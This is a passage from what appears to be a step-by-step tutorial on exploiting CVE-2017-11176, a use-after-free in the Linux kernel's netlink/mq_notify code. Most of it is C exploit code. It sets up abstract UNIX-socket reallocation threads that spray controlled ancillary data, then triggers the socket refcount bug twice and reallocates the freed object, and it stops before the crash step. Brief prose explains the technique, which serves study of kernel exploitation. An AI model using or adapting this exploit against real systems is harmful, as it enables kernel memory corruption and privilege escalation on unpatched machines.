<span class="w">  </span><span class="n">first</span><span class="o">-&gt;</span><span class="n">cmsg_level</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">// must be different than SOL_SOCKET=1 to "skip" cmsg</span>
<span class="w">  </span><span class="n">first</span><span class="o">-&gt;</span><span class="n">cmsg_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="c1">// &lt;---- ARBITRARY VALUE</span>

<span class="w">  </span><span class="c1">// TODO: do something useful will the remaining bytes (i.e. arbitrary call)</span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Because we will re-allocate with AF_UNIX sockets, we need to prepare them. We will create a pair of socket for <em>every reallocation threads. Here, we create a _special kind</em> of unix sockets: <strong>abstract sockets</strong> (man 7 unix). That is, their address starts with a NULL byte ('@' in <em>netstat</em>). This is not mandatory, just a preference. The sender socket connects to the receiver socket and finally, we set the <em>timeout</em> value to <em>MAX_SCHEDULE_TIMEOUT</em> with <em>setsockopt()</em>:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">realloc_thread_arg</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="n">pthread_t</span><span class="w"> </span><span class="n">tid</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">recv_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">send_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">sockaddr_un</span><span class="w"> </span><span class="n">addr</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">init_unix_sockets</span><span class="p">(</span><span class="k">struct</span> <span class="nc">realloc_thread_arg</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">rta</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">timeval</span><span class="w"> </span><span class="n">tv</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock_counter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(((</span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">recv_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_socket</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DGRAM</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"></span>
<span class="w">      </span><span class="p">((</span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">send_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_socket</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DGRAM</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] socket"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="c1">// bind an "abstract" socket (first byte is NULL)</span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">));</span><span class="w"></span>
<span class="w">  </span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">.</span><span class="n">sun_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_UNIX</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">sprintf</span><span class="p">(</span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">.</span><span class="n">sun_path</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">"sock_%lx_%d"</span><span class="p">,</span><span class="w"> </span><span class="n">_gettid</span><span class="p">(),</span><span class="w"> </span><span class="o">++</span><span class="n">sock_counter</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_bind</span><span class="p">(</span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">recv_fd</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">)))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] bind"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_connect</span><span class="p">(</span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">send_fd</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">)))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] connect"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="c1">// set the timeout value to MAX_SCHEDULE_TIMEOUT</span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tv</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">tv</span><span class="p">));</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_setsockopt</span><span class="p">(</span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">recv_fd</span><span class="p">,</span><span class="w"> </span><span class="n">SOL_SOCKET</span><span class="p">,</span><span class="w"> </span><span class="n">SO_SNDTIMEO</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">tv</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">tv</span><span class="p">)))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] setsockopt"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="c1">// TODO: release everything</span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] failed to initialize UNIX sockets!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>The reallocation threads are initialized with <strong>init_reallocation()</strong>:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">init_reallocation</span><span class="p">(</span><span class="k">struct</span> <span class="nc">realloc_thread_arg</span><span class="w"> </span><span class="o">*</span><span class="n">rta</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">nb_reallocs</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="kr">thread</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">can_use_realloc_gadget</span><span class="p">())</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] can't use the 'ancillary data buffer' reallocation gadget!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] can use the 'ancillary data buffer' reallocation gadget!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">init_realloc_data</span><span class="p">())</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] failed to initialize reallocation data!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] reallocation data initialized!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] initializing reallocation threads, please wait...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kr">thread</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="kr">thread</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">nb_reallocs</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="kr">thread</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">init_unix_sockets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rta</span><span class="p">[</span><span class="kr">thread</span><span class="p">]))</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] failed to init UNIX sockets!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rta</span><span class="p">[</span><span class="kr">thread</span><span class="p">].</span><span class="n">tid</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">realloc_thread</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rta</span><span class="p">[</span><span class="kr">thread</span><span class="p">]))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] pthread_create"</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="c1">// wait until all threads have been created</span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">g_nb_realloc_thread_ready</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">nb_reallocs</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="n">_sched_yield</span><span class="p">();</span><span class="w"> </span><span class="c1">// don't run me, run the reallocator threads!</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] %lu reallocation threads ready!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">nb_reallocs</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] failed to initialize reallocation</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Once started, the reallocation thread prepares the sender socket to block by flooding the receiver's receive buffer with <em>MSG_DONTWAIT</em> (i.e. non-blocked), and then blocks until the "big GO" (i.e. reallocation):</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">g_nb_realloc_thread_ready</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">g_realloc_now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="nf">realloc_thread</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">arg</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">realloc_thread_arg</span><span class="w"> </span><span class="o">*</span><span class="n">rta</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">realloc_thread_arg</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">arg</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="n">mhdr</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span><span class="w"></span>

<span class="w">  </span><span class="c1">// initialize msghdr</span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">iovec</span><span class="w"> </span><span class="n">iov</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">iov_base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">iov_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span><span class="w"></span>
<span class="w">  </span><span class="p">};</span><span class="w"></span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mhdr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">mhdr</span><span class="p">));</span><span class="w"></span>
<span class="w">  </span><span class="n">mhdr</span><span class="p">.</span><span class="n">msg_iov</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">iov</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">mhdr</span><span class="p">.</span><span class="n">msg_iovlen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// the thread should inherit main thread cpumask, better be sure and redo-it!</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">migrate_to_cpu0</span><span class="p">())</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// make it block</span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">_sendmsg</span><span class="p">(</span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">send_fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">mhdr</span><span class="p">,</span><span class="w"> </span><span class="n">MSG_DONTWAIT</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">errno</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">EAGAIN</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"> </span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] sendmsg"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="c1">// use the arbitrary data now</span>
<span class="w">  </span><span class="n">iov</span><span class="p">.</span><span class="n">iov_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">16</span><span class="p">;</span><span class="w"> </span><span class="c1">// don't need to allocate lots of memory in the receive queue</span>
<span class="w">  </span><span class="n">mhdr</span><span class="p">.</span><span class="n">msg_control</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">g_realloc_data</span><span class="p">;</span><span class="w"> </span><span class="c1">// use the ancillary data buffer</span>
<span class="w">  </span><span class="n">mhdr</span><span class="p">.</span><span class="n">msg_controllen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">g_realloc_data</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">g_nb_realloc_thread_ready</span><span class="o">++</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">g_realloc_now</span><span class="p">)</span><span class="w"> </span><span class="c1">// spinlock until the big GO!</span>
<span class="w">    </span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// the next call should block while "reallocating"</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_sendmsg</span><span class="p">(</span><span class="n">rta</span><span class="o">-&gt;</span><span class="n">send_fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">mhdr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] sendmsg"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>

<span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] REALLOC THREAD FAILURE!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>The reallocation threads will <em>spinlock</em> with <strong>g_realloc_now</strong>, until the main thread tells them to start the reallocation with <strong>realloc_NOW()</strong> (it is important to keep it <em>inlined</em>):</p><div class="highlight"><pre><span></span><code><span class="c1">// keep this inlined, we can't loose any time (critical path)</span>
<span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">always_inline</span><span class="p">))</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="n">realloc_NOW</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="n">g_realloc_now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">_sched_yield</span><span class="p">();</span><span class="w"> </span><span class="c1">// don't run me, run the reallocator threads!</span>
<span class="w">  </span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>The <strong>sched_yield()</strong> syscall forces the main thread to be preempted. Fortunately, the next scheduled thread will be one of our reallocated thread, hence win the reallocation race.</p><p>Finally, the <strong>main()</strong> code becomes:</p><div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sock_fd</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sock_fd2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">unblock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">realloc_thread_arg</span><span class="w"> </span><span class="n">rta</span><span class="p">[</span><span class="n">NB_REALLOC_THREADS</span><span class="p">];</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] -={ CVE-2017-11176 Exploit }=-</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">migrate_to_cpu0</span><span class="p">())</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] failed to migrate to CPU#0</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] successfully migrated to CPU#0</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="n">rta</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">rta</span><span class="p">));</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">init_reallocation</span><span class="p">(</span><span class="n">rta</span><span class="p">,</span><span class="w"> </span><span class="n">NB_REALLOC_THREADS</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] failed to initialize reallocation!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] reallocation ready!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">sock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prepare_blocking_socket</span><span class="p">())</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] netlink socket created = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">sock_fd</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(((</span><span class="n">unblock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_dup</span><span class="p">(</span><span class="n">sock_fd</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">((</span><span class="n">sock_fd2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_dup</span><span class="p">(</span><span class="n">sock_fd</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] dup"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">unblock_fd</span><span class="p">,</span><span class="w"> </span><span class="n">sock_fd2</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// trigger the bug twice AND immediatly realloc!</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">decrease_sock_refcounter</span><span class="p">(</span><span class="n">sock_fd</span><span class="p">,</span><span class="w"> </span><span class="n">unblock_fd</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"></span>
<span class="w">      </span><span class="n">decrease_sock_refcounter</span><span class="p">(</span><span class="n">sock_fd2</span><span class="p">,</span><span class="w"> </span><span class="n">unblock_fd</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">realloc_NOW</span><span class="p">();</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] ready to crash?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">PRESS_KEY</span><span class="p">();</span><span class="w"></span>

